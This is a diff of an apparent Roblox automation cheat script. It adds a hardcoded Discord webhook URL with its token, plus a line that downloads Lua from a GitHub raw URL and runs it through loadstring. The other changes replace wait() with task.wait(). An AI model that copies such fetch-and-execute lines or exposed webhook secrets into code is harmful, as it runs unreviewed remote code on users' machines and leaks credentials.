@@ -55,7 +55,8 @@ local stele = workspace.Lobby.ClassicPartyTeleporters.Teleporter2
 local ptyFind = game:GetService("Players").LocalPlayer.PlayerGui.MainGui.HUD.Main2.PartyFinder
 local proximityThreshold = 50
 getgenv().TeleLoop = true
-
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1414475376230535199/F6V5IZJkOUMdxd-ZdC32JdlaTw-FGDz-raRMGW7a6FsYTmYtRkqOSfLy123hat3xSNR1"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lghft/Current/refs/heads/main/utd/webhook.lua'))()
 function missing(t, f, fallback)
 	if type(f) == t then return f end
 	return fallback
@@ -177,16 +178,16 @@ if plrAmount == 1 and game.Players.LocalPlayer and game.Workspace.Lobby and plrA
         
         local mapSelection = safeGetGui({game:GetService("Players").LocalPlayer.PlayerGui, "MainGui", "MainFrames", "MapSelection"}, 10)
         if mapSelection then
-            repeat wait() until mapSelection.Visible == true
+            repeat task.wait() until mapSelection.Visible == true
             
             local mapS = mapSelection:FindFirstChild("MapList") and mapSelection.MapList:FindFirstChild("ScrollingFrame") and mapSelection.MapList.ScrollingFrame:FindFirstChild("LasNoches")
             if mapS then
                 firesignal(mapS.Activated)
-                wait(0.5)
+                task.wait(0.5)
                 local hrdB = mapSelection:FindFirstChild("SelectedMap") and mapSelection.SelectedMap:FindFirstChild("Buttons") and mapSelection.SelectedMap.Buttons:FindFirstChild("HardButton")
                 if hrdB then
                     firesignal(hrdB.Activated)
-                    wait(0.55)
+                    task.wait(0.55)
                     local strtB = mapSelection.SelectedMap.Buttons:FindFirstChild("StartButton")
                     if strtB then
                         firesignal(strtB.Activated)
